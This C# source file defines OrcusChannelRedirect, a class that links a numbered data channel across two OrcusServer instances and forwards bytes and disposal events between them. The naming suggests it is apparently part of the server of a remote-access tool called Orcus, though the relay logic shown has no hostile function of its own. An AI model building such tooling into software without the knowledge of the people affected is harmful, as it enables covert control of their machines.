using System;
using Orcus.Modules.Api;
using Orcus.Sockets;
using Orcus.Utilities;

namespace Orcus.Server.Service.Channels
{
    [SynchronizedChannel]
    public class OrcusChannelRedirect : IDataChannel
    {
        private readonly int _channelId;
        private readonly OrcusServer _server1;
        private readonly OrcusServer _server2;
        private readonly Channel _channel;

        public OrcusChannelRedirect(int channelId, OrcusServer server1, OrcusServer server2)
        {
            _channelId = channelId;
            _server1 = server1;
            _server2 = server2;
            server1.AddChannel(this, channelId);

            _channel = new Channel
            {
                DataReceived = DataReceived,
                Disposed = Server2ChannelDisposed
            };
            server2.AddChannel(_channel, channelId);
        }

        private void Server2ChannelDisposed()
        {
            _server1.CloseChannel(_channelId).Forget();
        }

        private void DataReceived(ArraySegment<byte> obj)
        {
            Send(obj.Array, obj.Offset, obj.Count, true);
        }

        public void Dispose()
        {
            _server2.CloseChannel(_channelId).Forget();
        }

        public int RequiredOffset { get; set; }
        public SendDelegate Send { get; set; }

        public void ReceiveData(byte[] buffer, int offset, int count)
        {
            _channel.Send(buffer, offset, count, true);
        }

        [SynchronizedChannel]
        private class Channel : IDataChannel
        {
            public void Dispose()
            {
                Disposed();
            }

            public Action Disposed;
            public Action<ArraySegment<byte>> DataReceived;

            public int RequiredOffset { get; set; }
            public SendDelegate Send { get; set; }

            public void ReceiveData(byte[] buffer, int offset, int count)
            {
                DataReceived.Invoke(new ArraySegment<byte>(buffer, offset, count));
            }
        }
    }
}